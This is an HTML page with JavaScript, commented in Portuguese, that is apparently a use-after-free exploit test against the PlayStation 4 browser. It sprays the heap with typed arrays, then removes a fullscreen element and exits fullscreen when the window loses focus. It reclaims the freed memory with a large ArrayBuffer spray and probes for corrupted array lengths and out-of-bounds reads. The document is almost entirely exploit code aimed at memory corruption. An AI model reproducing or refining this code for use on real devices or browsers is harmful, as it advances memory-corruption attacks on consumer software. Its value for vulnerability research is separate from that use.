<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 UAF - Teste 4 + Reclaim (FIEL)</title>
</head>
<body style="background:#222;color:#0f0;font-family:monospace;">

<h2>Teste 4 (Exploit Path)</h2>
<button onclick="runTest()">Run Test</button>

<div id="log"></div>

<script>
function log(msg) {
    try { console.log(msg); } catch(e){}
    document.getElementById("log").innerHTML += "<p>" + msg + "</p>";
}

function setupHeap() {
    let controllers = [];

    for(let i = 0; i < 5000; i++) {
        let arr = new Float64Array(8);
        arr[0] = i;
        controllers.push(arr);
    }

    return controllers;
}

function setupFullscreen() {
    let fsTarget = document.createElement("div");
    fsTarget.innerHTML = "<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";
    fsTarget.style.background = "black";
    fsTarget.style.width = "100%";
    fsTarget.style.height = "100%";
    fsTarget.style.position = "absolute";
    fsTarget.style.top = "0";
    fsTarget.style.left = "0";

    document.body.appendChild(fsTarget);

    if (fsTarget.webkitRequestFullscreen) {
        fsTarget.webkitRequestFullscreen();
    }

    return fsTarget;
}

// 🔥 RECLAIM AGRESSIVO (SEM ALTERAR FLUXO)
function aggressiveReclaim() {
    log("[*] Aggressive reclaim iniciado");

    let spray = [];

    for (let i = 0; i < 30000; i++) {
        let buf = new ArrayBuffer(0x40);
        let f64 = new Float64Array(buf);
        f64[0] = 13.37;

        // mistura leve (igual seus testes antigos)
        let str = "TXT_" + i;

        spray.push(f64);
        spray.push(str);
    }

    log("[*] Aggressive reclaim finalizado: " + spray.length);
}

function trigger(fsTarget, victims) {
    log("[*] Trigger: remove + exitFullscreen");

    try {
        fsTarget.remove();

        if (document.webkitIsFullScreen || document.fullscreenElement) {
            document.webkitExitFullscreen?.();
        }

        // 🔥 IMPORTANTE: RECLAIM DEPOIS DO TRIGGER (mas antes do reload)
        aggressiveReclaim();

    } catch(e) {
        log("[ERRO] " + e);
    }

    // 🔴 NÃO MEXER — ISSO É PARTE DO BUG
    setTimeout(() => location.reload(), 500);
}

// 🔬 probe leve (não intrusivo)
function probe(victims) {
    log("---- PROBE ----");

    for (let i = 0; i < victims.length; i++) {
        let v = victims[i];

        try {
            if (v.length !== 8 || v.byteLength !== 64) {
                log("[CORRUPÇÃO DETECTADA]");
                log("len=" + v.length + " byteLen=" + v.byteLength);
                log("OOB=" + v[20]);
                return;
            }
        } catch(e) {
            log("[EXCEPTION] " + e);
            return;
        }
    }

    log("[OK] sem corrupção visível");
}

function runTest() {
    const logDiv = document.getElementById("log");
    logDiv.innerHTML = "<p>Running... Press OPTIONS</p>";

    let victims = setupHeap();
    let fsTarget = setupFullscreen();

    window.onblur = function() {
        log("[*] onblur disparado");

        // 🔴 NÃO MEXER — ESSENCIAL
        setTimeout(() => {
            trigger(fsTarget, victims);

            // probe leve depois
            setTimeout(() => probe(victims), 100);

        }, 3000);
    };
}
</script>
